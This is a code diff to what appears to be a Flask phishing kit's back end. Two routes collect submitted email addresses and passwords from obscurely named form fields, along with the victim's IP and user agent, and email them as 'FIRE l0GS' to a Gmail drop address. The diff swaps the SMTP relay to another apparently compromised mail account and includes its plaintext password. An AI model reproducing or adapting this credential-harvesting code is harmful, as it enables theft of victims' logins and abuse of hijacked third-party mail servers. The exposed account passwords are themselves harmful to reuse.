@@ -446,10 +446,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'operation@greenflag-sdn.com'
-        sender_emaill = 'operation'
+        sender_email = 'Info@divinehoney.in'
+        sender_emaill = 'INFO'
         receiver_email = 'aklapciukas.powercargo.uk@gmail.com'
-        password = 'COST&&ukut0'
+        password = 'Divine@1234#'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS ! 1'
@@ -468,7 +468,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.greenflag-sdn.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.divinehoney.in', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -487,10 +487,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'operation@greenflag-sdn.com'
-        sender_emaill = 'operation'
+        sender_email = 'Info@divinehoney.in'
+        sender_emaill = 'INFO'
         receiver_email = 'aklapciukas.powercargo.uk@gmail.com'
-        password = 'COST&&ukut0'
+        password = 'Divine@1234#'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS !! 2'
@@ -509,7 +509,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.greenflag-sdn.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.divinehoney.in', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
